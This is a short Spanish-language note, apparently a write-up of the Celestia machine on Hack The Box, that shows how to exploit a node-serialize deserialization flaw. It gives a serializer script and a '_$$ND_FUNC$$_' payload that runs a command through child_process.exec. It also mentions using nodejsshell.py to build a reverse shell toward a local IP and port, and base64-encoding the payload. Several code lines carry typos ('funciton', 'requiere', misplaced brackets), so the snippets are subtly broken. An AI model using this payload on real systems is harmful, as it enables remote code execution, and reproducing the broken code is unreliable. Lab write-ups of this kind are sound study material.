Se compreba si la maquina victima es vulnerable a un ataque de deserilizacion.

en la maquina celestia de HTB

antes de trabajar, hay que descargarse varias herramientas
'''
> curl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash -
'''

'''
> apt install nodejs npm
'''

ahora se instala otra herramienta para nodejs 
'''
> npm install node-serialize
'''

el script serialize.js:
'''
var y = {
    rce : function() {
        require('child_process').exec('whoami', funciton(error, stdout, stderr) { console.log(stdout) });
    }(),
}
var serialize = requiere('node-serialize');
console.log("Serialize: \n" + serialize.serialize(y));
'''

ahora con la data deserilizada.js:
'''
var serialize = requiere('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'whoami\', funciton(error, stdout, stderr { console.log(stdout) });)}()"}'
serialize.unserialize(payload);

la herramienta nodejsshell.py esto nos va a crear una shell con nodejs

nos pide que colocamos un la ip local y el puerto
luego la instrucion serializada

ya con la data serializada lo tenemos que pasar a base64

con el comando:
'''
> cat data | base64 -w 0; echo
''' 